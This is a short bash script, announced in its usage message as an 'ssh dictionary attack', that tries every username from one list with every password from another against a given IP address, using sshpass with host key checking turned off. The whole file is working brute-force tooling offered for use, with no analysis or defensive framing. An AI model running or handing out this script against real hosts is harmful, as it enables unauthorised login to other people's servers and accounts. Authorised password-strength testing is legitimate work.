#!/bin/bash

if [ -z "$1" ]; then
    echo "[*] ssh dictionary attack"
    echo "[*] usage : $0 <userlist> <passlist> <ip>"
    exit 0
fi
for i in $(cat $1) ; do for j in $(cat $2) ; do sshpass -p $j ssh -o StrictHostKeyChecking=no $i@$3; done ; done

